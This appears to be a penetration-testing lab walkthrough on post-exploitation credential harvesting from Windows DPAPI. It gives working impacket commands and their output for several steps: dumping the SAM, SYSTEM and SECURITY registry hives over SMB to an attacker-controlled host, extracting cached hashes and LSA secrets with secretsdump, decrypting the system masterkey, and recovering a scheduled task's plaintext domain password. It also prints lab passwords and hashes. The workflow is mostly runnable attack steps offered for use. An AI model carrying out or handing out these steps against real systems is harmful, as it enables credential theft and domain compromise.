

When dealing with decrypting DPAPI machine blobs the system masterkeys are stored at directory is `C:\Windows\System32\Microsoft\Protect\S-1-5-18\User`. The `User` subfolder is specifically used for DPAPI masterkeys that are scoped to the context of special system users (such as `SYSTEM`, `LocalService`, or `NetworkService`) but are encrypted with the system’s DPAPI secrets rather than a traditional user password. 

These masterkeys are typically created for operations that run under these system accounts to run tasks for users, such as scheduled tasks, Windows services, or background processes needing to store protected credentials or configuration data. For example, Windows Task Scheduler jobs running as SYSTEM, service credential storage, or network authentication tokens for services can all leverage these system-scoped.

Once we have administrative access to a host, we can extract the `SAM`, `SYSTEM`, and `SECURITY` registry hives remotely and parse them offline to retrieve sensitive data such as LSA secrets, machine account hashes, cached credentials, and DPAPI keys. This approach is especially useful in scenarios where we already have administrative privileges but want to avoid interacting with live processes such as `LSASS` or creating new processes on the host.

To begin, the **Preferred** file holds a binary identifier that indicates the master DPAPI key currently in use. This file is located in the same directory of the masterkeys usually. Again this would be at  `C:\Windows\System32\Microsoft\Protect\S-1-5-18\User`, this file can be examined to reveal the active masterkey GUID, which in turn allows you to find and decrypt the corresponding masterkey file.


... Add `Preferred` file transfer from host to attacker box... 

To examine the contents of the `Preferred` file, use the `hexdump` tool on kali linux:

```
hexdump -C Preferred

00000000  0c 6f 8d a3 4e 74 b4 48  b6 e4 fc 47 b1 a4 f7 c1  |.o..Nt.H...G....|
00000010  d0 40 79 d8 87 37 dc 01                           |.@y..7..|
00000018

```

The bytes in `Preferred` represent the GUID of the masterkey currently in use, stored in a mixed-endian format. As an example to better understand how to read this would be to take the first 4 bytes of present and this case it would be;

```
0c 6f 8d a3
```

Reversing their order gives:

```
a3 8d 6f 0c
```

This reversed sequence matches the beginning of an existing master key file:

```
a38d6f0c-744e-48b4-b6e4-fc47b1a4f7c1
```

To confirm, look at the next two bytes:

```
4e 74 
```

Reversing their order yields:

```
74 4e
```

Appending this to the previously reversed bytes, we get:

```
a3 8d 6f 0c 74 4e
```

This continues to match the GUID of the master key file, further confirming that `a38d6f0c-744e-48b4-b6e4-fc47b1a4f7c1` is the active master key referenced by the `Preferred` file.

With this information, we can proceed to collect the necessary registry hive files. One common method is to host a writable SMB share using `impacket-smbserver` to receive the dumped hives from the target system:

```
impacket-smbserver -smb2support . /home/kali/

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                          
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed                                                                                                                                                                                              
[*] Incoming connection (10.3.10.11,51831)                                                              
[*] AUTHENTICATE_MESSAGE (\,DC01)                                                                       
[*] User DC01\ authenticated successfully                                                               
[*] :::00::aaaaaaaaaaaaaaaa                                                                             
[*] Connecting Share(1:IPC$)                                                                            
[*] Connecting Share(2:test)                                                                            
[*] Disconnecting Share(1:IPC$)                                                                         
[*] Disconnecting Share(2:test)                                                                         
[*] Closing down connection (10.3.10.11,51831)                                                          
```

If the `RemoteRegistry` service is not running on the target, the tool will start it automatically. Once completed, the target system will save the contents of `HKLM\SAM`, `HKLM\SYSTEM`, and `HKLM\SECURITY` as `.save` files into the SMB share.

```
impacket-reg 'josa.local'/'admin':'a5ync_S3cuRiTy_L@Bs'@'10.3.10.204' backup -o '\\\\198.51.100.3\\'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Saved HKLM\SAM to \\198.51.100.3\test\SAM.save
[*] Saved HKLM\SYSTEM to \\198.51.100.3\test\SYSTEM.save
[*] Saved HKLM\SECURITY to \\198.51.100.3\test\SECURITY.save
[*] Stopping service RemoteRegistry

```

With the hives now accessible, we can extract credentials using `impacket-secretsdump`. This tool parses the registry offline and outputs credential material including cached hashes, plaintext secrets, and DPAPI system keys.

```python
impacket-secretsdump -system SYSTEM.save -security SECURITY.save local

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x6279c5815e2cf16161e5d9113970f1ee
[*] Dumping cached domain logon information (domain/username:hash)
JOSA.LOCAL/User:$DCC2$10240#User#0f1ee2e3f11b21fbdd224f903e4b46d7: (2025-07-09 12:54:38+00:00)
JOSA.LOCAL/Admin:$DCC2$10240#Admin#8025f7a446298af1f3471dacc395bd51: (2025-07-09 12:54:41+00:00)
JOSA.LOCAL/T1-T.LANGFORD:$DCC2$10240#T1-T.LANGFORD#1da6623f4b6b05f69bb02be9785dfbf7: (2025-07-09 13:26:27+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:fb58ed2140749522bae8ac19663e1eceae4f44425e8b7e4da240ace9422a30f8b46b5cebcb946f38b16796c20b22b095bec284861f0441f3b9d89e2e1494849ab0e3c75d60aed67d0a849c674c62f493ed4cb8b7b4fc99aa28071ae933043c6273a51bfa0fe3ce7d85731b1bd390863a2eb5e30d7f4bc7d59e0b72bae36a50582e01110b55ad13119505e8e5555729cc4cc9f0aa2d26063e5ff468db313deb57a48cf6c305439a8b5120710aca15ca0f4e083e956cbc6905e14a4a2de27cd5ade2a0e6d8e2ee70a30cfa63e7cb61893581043697c308a23d3977844fc50836af5f5b9b387db77705563c59972edc594e
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:6e215682c64fcbcf9b19708a2bb0dd39
[*] DefaultPassword 
(Unknown User):password
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xa5b512b05275f4cf9684ff293e0e551e008238cc
dpapi_userkey:0xcd6398b1b73cd0ddeb26cbea43c1bf3c425d4d4b
[*] NL$KM 
 0000   51 96 B6 B9 3C B8 5C 4C  2D D2 C4 C4 36 9D 42 68   Q...<.\L-...6.Bh
 0010   13 75 A8 9F 53 8D 78 E4  98 C8 18 24 5A CF 1B 7B   .u..S.x....$Z..{
 0020   3C 97 C8 68 49 C4 95 6F  AB BB A1 FB 50 2A 6F 8D   <..hI..o....P*o.
 0030   C4 43 0D CC 8F 6D 47 7C  19 CC B5 E8 1E 55 2F AC   .C...mG|.....U/.
NL$KM:5196b6b93cb85c4c2dd2c4c4369d42681375a89f538d78e498c818245acf1b7b3c97c86849c4956fabbba1fb502a6f8dc4430dcc8f6d477c19ccb5e81e552fac

```


From this output, we retrieve several valuable items. Most importantly, we recover the `DPAPI_SYSTEM` key, which includes both the machine key and user key used for decrypting DPAPI-protected blobs on the system

To proceed with DPAPI decryption, we inspect the available masterkeys on disk. These are located in the `Microsoft\Protect` folder under the appropriate user SID. For the system context, this typically resides under `S-1-5-18\User`.



```
PS C:\Windows\System32\Microsoft\Protect\S-1-5-18\User> ls -Force


    Directory: C:\Windows\System32\Microsoft\Protect\S-1-5-18\User


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          7/9/2025   8:42 PM            468 2c54fe10-3c97-4ced-b6b7-41e4ae3080d4
-a-hs-          7/9/2025   8:42 PM            468 9a3b2b12-7bd0-432d-b27e-ae394510dde5
-a-hs-          7/9/2025   8:42 PM            468 a38d6f0c-744e-48b4-b6e4-fc47b1a4f7c1
-a-hs-          7/9/2025   8:42 PM             24 Preferred
```

The files are present are the encrypted DPAPI masterkeys. Since we already possess the corresponding `dpapi_userkey`, we can now attempt to decrypt one of these masterkeys using the `impacket-dpapi` tool.

```
impacket-dpapi masterkey -file a38d6f0c-744e-48b4-b6e4-fc47b1a4f7c1 -key 0xcd6398b1b73cd0ddeb26cbea43c1bf3c425d4d4b

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : a38d6f0c-744e-48b4-b6e4-fc47b1a4f7c1
Flags       :        6 (6)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with key provided
Decrypted key: 0x6975fd23d2ef714d64f0702db10a2ad1b5dc2f09b52d19a99995d2663477d6e7463fda2ab7f6747697e21f5cd9b210aed5bad3db4f144e83c57fc429540bbb6f
```

Once the decryption is successful, the tool will output the full plaintext masterkey. This masterkey can now be used to decrypt any DPAPI blob that references it.

To validate the process, the location where these DPAPI-protected credential blobs are stored is typically:

```
C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
```

For example on our current host:

```
PS C:\Users\admin> cd C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
PS C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials> ls -Force


    Directory: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          7/9/2025   9:47 PM            560 A8D7AE9CDD90DF6CA47160A2A8ECA9E0
-a-hs-          7/9/2025   8:43 PM          11136 DFBE70A7E5CC19A398EBF1B96859CE5D
```

You can now use the decrypted masterkey with `impacket-dpapi` to attempt decryption of one of these credential blobs:

```
kali@kali ~/t/SharpCollection (master)> impacket-dpapi credential -file A8D7AE9CDD90DF6CA47160A2A8ECA9E0 -key 0x6975fd23d2ef714d64f0702db10a2ad1b5dc2f09b52d19a99995d2663477d6e7463fda2ab7f6747697e21f5cd9b210aed5bad3db4f144e83c57fc429540bbb6f
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-07-09 13:47:05+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:batch=TaskScheduler:Task:{82332888-C4EA-4E15-8433-4B4692F4E725}
Description : 
Unknown     : 
Username    : josa\T1-T.LANGFORD
Unknown     : 2YE3NKgcbvYe
```

If successful, this will output the decrypted credential data, confirming that the DPAPI masterkey is valid and can be used to recover secrets protected on this system. This workflow mirrors the process described in the curriculum for extracting and leveraging DPAPI secrets during credential harvesting and post-exploitation.




